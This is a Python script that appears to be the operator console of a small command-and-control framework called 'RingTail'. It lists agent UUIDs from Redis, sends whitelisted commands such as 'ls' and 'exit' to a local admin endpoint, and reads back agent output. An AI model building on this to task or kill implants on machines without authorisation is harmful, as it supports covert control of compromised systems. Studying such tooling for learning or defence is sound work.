import requests
import redis
import sys
import time

url = "http://127.0.0.1:8000/admin"
header = {"Content-Type": "application/json"}

r = redis.Redis(host='127.0.0.1', port=6379, db=0, decode_responses=True)

def cmd_check(message):
    words = message.split()
    if not words:
        return False

    if words[0] in command_reg:
        return True
    else:
        return False

command_reg = {
    "exit",
    "ls",
    "list-agents",
}

logo = r"""
                        ⠤⣀⣀⣾⣷⡾⣿⣷⣀⢳⣿⣿⣿⣦⣆⡠⢀⣀⠀⠀⠀
                    ⠀⠀⢠⣿⣏⠱⢾⡙⢏⠟⡥⢩⠛⣼⠷⢫⡹⡿⢟⢿⣛⡿⣿⣷⣦⣠⣤⡄⠀⠀⠀
                 ⠒⣶⣬⣶⣟⠻⡹⢾⣿⠻⠍⠆⠈⠄⡀⢩⢆⠙⡀⠇⣉⢾⡾⣵⣾⣿⣯⢿⣟⣿⣿⣶⠀⠀⠀
                ⣰⣟⠏⡿⣿⣟⣳⣕⣻⣦⢋⡔⠀⠁⠠⠐⠈⡌⠀⢠⠐⣊⠲⣱⢻⡾⣽⣻⢿⣾⢟⣿⣿⣿⣤⣄⡀⠀⠀⠀
        ⠀⠀⠈⠀⢰⣤⣶⣿⣯⣞⣽⣿⣛⢶⡺⣧⢆⣡⡀⠄⡁⠐⠤⢁⠢⢡⠄⣒⠦⢳⡡⣏⡖⢧⢫⢏⡜⣯⣿⣻⣽⢻⣿⣧⣄⣀⠀⠀⠀
        ⠀⠠⢰⣶⠾⡟⡧⣿⢿⡿⣿⣽⣛⣶⣽⣯⣛⠤⣐⠈⡄⢩⠐⢂⡱⣠⢛⡴⢩⠳⣝⣭⢻⣭⡷⣎⣽⣽⣻⣷⢾⣩⣖⣿⡿⠋⠀⠀⠀
        ⠀⠀⢀⣻⢮⡱⢻⣿⢯⣿⡙⡷⢻⡙⣾⣳⡿⣏⡙⣎⡐⡡⡜⢆⢧⡱⢎⠾⣥⢻⡼⣾⠻⡅⡛⡗⣿⢾⣻⣿⣟⣶⣿⣻⣷⡶⠀⠀⠀
        ⠀⠨⢙⣿⣯⣷⡿⢇⠲⡅⠹⢈⠡⢏⡔⢫⣟⣾⣝⣦⣳⡱⣭⣞⢦⣝⢮⣻⡜⣧⣟⡹⠅⢀⠡⢙⠴⡻⢭⢓⡎⠗⣮⠿⣿⣦⡀⠀⠀
        ⠀⢠⢭⡹⠬⣙⢳⡉⠂⢀⠐⠠⠑⡄⢬⢲⣹⣿⣿⣿⣷⣿⣷⣿⣷⣿⣿⣷⣹⣶⢏⡒⠀⠂⢀⠁⢊⠘⣇⠎⠘⡠⠃⡞⡥⠾⣧⡄⠀
        ⢀⡸⡑⠆⠡⠐⢨⠚⠄⣀⠂⡅⢣⠼⣭⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣩⠀⢂⠀⠎⢠⠑⡈⠀⢂⠠⠑⠠⠜⡓⣎⣳⡦
        ⡨⢒⠠⠀⡐⠈⡀⡘⠰⣠⢓⣬⢳⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣡⡐⠆⡨⠘⡀⠆⢀⠐⠀⡂⢌⡡⢆⣹⠴⣻⠀
        ⠁⣇⠒⡁⠄⡠⢡⢈⣅⠲⣭⢾⣿⣿⣿⣿⣿⣿⣿⣿⡯⠿⢿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣽⣡⡗⣱⡜⡰⢂⠠⡑⡌⢀⡳⢍⣦⢻⣏⠁
        ⠀⠗⣏⢄⢣⡔⣢⠝⣆⠷⣮⣷⣿⣿⣿⣿⣿⡿⠟⢿⣿⣶⣼⣿⡿⣧⣿⣿⠾⠛⢛⣿⣿⣿⣿⣿⣼⠱⣊⠶⡱⣍⢦⠹⣜⡸⢿⣅⠀
        ⠀⢀⠙⠘⡯⣶⣿⣞⣿⣿⣾⣿⣿⣿⣿⣿⠛⣟⣆⠀⠙⣿⣿⣿⣿⣿⣿⠃⡆⠀⠀⣿⣿⣿⣿⣿⣷⣯⢧⣓⡳⡜⡶⣫⢼⣹⡧⠛⠁
        ⠀⠀⠁⠀⠐⠿⠿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠿⣿⣿⣆⠀⢸⣿⣿⣿⣿⡿⠀⠀⣀⣼⣿⣿⣿⣿⣿⣿⣿⣧⣿⣵⣫⡵⠯⠾⠽⠃⠀⠀
              ⡀⠻⠿⠛⢙⠟⠟⠁⠧⠔⠀⠠⠍⠛⢿⣿⣿⣿⣿⣿⣇⣴⣾⣿⠟⢋⠉⠻⢿⣿⣿⣿⣿⡿⠿⠀⠀
                            ⠂⠹⣿⣿⣿⣿⣿⣿⠛⠀⠀
                             ⠈⣿⣿⣿⣿⡟⠁⠀⠀
                              ⣿⣿⣿⣿⣻⠀⠀ 
                              ⣿⣿⣿⣿⣿⡀⠀⠀
                             ⣾⣿⣿⣿⣿⣿⣿⣀⠀⠀
                        ⣂⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣬⣒⡀⠀
██    ██  ██████   ██████  ██████  ██████   █████  ███████ ██ ██      
 ██  ██  ██       ██       ██   ██ ██   ██ ██   ██ ██      ██ ██      
  ████   ██   ███ ██   ███ ██   ██ ██████  ███████ ███████ ██ ██      
   ██    ██    ██ ██    ██ ██   ██ ██   ██ ██   ██      ██ ██ ██      
   ██     ██████   ██████  ██████  ██   ██ ██   ██ ███████ ██ ███████ 
"""

print(logo, "\n")
print("==================== Type 'agents' To Get UUIDs ====================")

# A forever loop to accept client connections
try:
    while True:
        message_to_send = input("RingTail > ")
        if not message_to_send.strip():
            continue

        if message_to_send == "agents":
            agent_list = r.lrange("agents", 0, -1)
            print(agent_list)
            uuid = input("Select an Agent UUID: ")
            continue
        
        if cmd_check(message_to_send) == True:
            json_payload = {"uuid": uuid, "command": message_to_send}
            response = requests.post(url, json=json_payload, headers=header)
            
            if message_to_send == "exit":
                print(f"\n========== Killing {uuid} ==========")
                continue

        else:
            command = message_to_send.split()
            print(f"ERROR: Invalid command: {command[0]}")
            continue

        print(response)
        if response.status_code == 200:
            key = f"{uuid}-output"
            while True:
                if r.exists(key):
                    bruh = r.lindex(key, -1)
                    print("Data sent confirmed: ", key)
                    output = r.rpop(key)
                    print(output)
                    break
                else:
                    time.sleep(1)
                    continue
                    
except KeyboardInterrupt:
    print("\nServer shutting down.")
    exit(0)